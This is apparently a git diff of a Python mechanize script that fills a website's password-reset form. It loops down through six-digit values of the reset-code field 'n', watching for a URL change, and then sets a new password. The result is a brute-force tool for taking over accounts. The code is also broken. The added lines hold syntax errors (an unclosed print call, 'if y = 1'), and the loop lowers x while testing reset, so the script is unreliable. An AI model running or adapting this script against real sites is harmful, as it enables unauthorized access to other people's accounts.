@@ -65,9 +65,6 @@ browser.select_form(nr=0)
 browser.submit()
 browser.select_form(nr=0)
 browser.submit()
-forms = list(browser.forms())
-form = forms[0]
-print(form)
 y = input('Continue? 1,2, else:')
 """reset code input"""
 browser.select_form(nr=0)
@@ -76,23 +73,27 @@ print(browser.geturl())
 reset = input('Code: ')
 browser.form['n'] = reset
 browser.submit()
-x = 999999
-while x > 99999:
+reset = 999999
+while reset > 99999:
   browser.select_form(nr=0)
-  browser.form['n'] = str(x)
+  browser.form['n'] = str(reset)
   url = browser.geturl()
+  print(str(reset)
+  sleep(30)
   if url != url1:
     break
   else:
     x -= 1
 """new password"""
+forms = list(browser.forms())
+form = forms[0]
+print(form)
+y = input('Continue/Exit? ')
+if y = 1:
+  quit()
+else:
+  y = 1
 new = input('New Password: ')
 browser.select_form(nr=0)
 browser.form['password_new'] = new
-browser.form.set_value(reset, nr=2)
-soup.find(string='password_new')
-x = 0
-while x < 2:
-  x += 1
-  print(x)
 """browser.form['n'] = x"""
